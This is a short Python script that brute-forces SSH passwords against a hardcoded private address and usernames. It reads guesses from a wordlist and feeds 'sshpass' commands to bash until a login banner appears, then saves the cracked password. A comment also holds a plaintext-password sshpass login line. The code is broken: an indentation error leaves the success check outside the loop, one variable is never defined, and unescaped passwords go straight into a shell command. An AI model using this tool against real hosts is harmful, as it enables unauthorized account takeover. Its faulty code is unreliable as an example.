#!/usr/bin/env python

# coding=utf-8
# 32-126 : 20-7E
# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics
from subprocess import Popen, PIPE, check_output
import time
import sys

p = 1
USERNAME = "sigurdkb"
IP_ADRESS = "172.16.0.30"
PORT = "22"
new_results = []
correct_pw = ""
cracked = bool(False)
counter = 0
guess_result = ((),)
pw = ''
# sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222

def connect_ssh():
 global correct_pw
 global cracked
 global guess_result
 global pw 

 while cracked == False:
  pw = get_next_pw()

  arg = 'sshpass -p ' + pw + ' ssh chrisb14@172.16.0.30 -p 22'
  proc = Popen('/bin/bash', stdin=PIPE, stdout=PIPE) 
  stdout = proc.communicate(arg.encode())
  guess_result = stdout
  print ("Try: " + pw ) 
if b'Welcome' in guess_result:
   print ("Correct password: " + pw)
   correct_pw = pw
   f = open("correct_pw.txt", 'w')
   f.write(correct_pw)
   cracked = True
else:
   print ("Tried: " + pw)


def get_next_pw():
 global counter
 global filenr

 f = open("wl.txt", 'r')
 l = f.readlines()[counter]
 if l == '':
  print ("wordlist_part"+ str(filenr) + " er ferdig")
  exit(0)
 else: 
  l =  'f'+l
  counter += 1
  return l.strip('\n')


connect_ssh()
